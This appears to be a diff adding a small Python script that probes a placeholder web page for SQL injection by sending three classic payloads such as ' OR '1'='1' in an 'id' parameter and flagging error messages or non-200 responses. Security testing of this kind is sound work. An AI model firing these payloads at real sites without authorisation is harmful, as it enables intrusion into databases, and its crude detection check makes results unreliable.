@@ -1,0 +1,37 @@
+import requests
+
+def test_sql_injection(url):
+    # List of payloads that attempt to exploit SQL injection vulnerabilities
+    payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR 1=1 --",
+    ]
+    
+    # List to keep track of vulnerable parameters
+    vulnerable_params = []
+
+    for payload in payloads:
+        # Assuming the application uses query parameters for input
+        params = {'id': payload}
+        response = requests.get(url, params=params)
+        
+        # Example condition checks: you might look for specific SQL error messages or unexpected behaviors
+        if "SQL syntax" in response.text or response.status_code != 200:
+            vulnerable_params.append(params)
+
+    return vulnerable_params
+
+def main():
+    url = "http://example.com/vulnerable-page.php"
+    vulnerable_params = test_sql_injection(url)
+    
+    if vulnerable_params:
+        print("Potential SQL Injection vulnerabilities detected with the following payloads:")
+        for params in vulnerable_params:
+            print(params)
+    else:
+        print("No obvious SQL Injection vulnerabilities detected.")
+
+if __name__ == "__main__":
+    main()
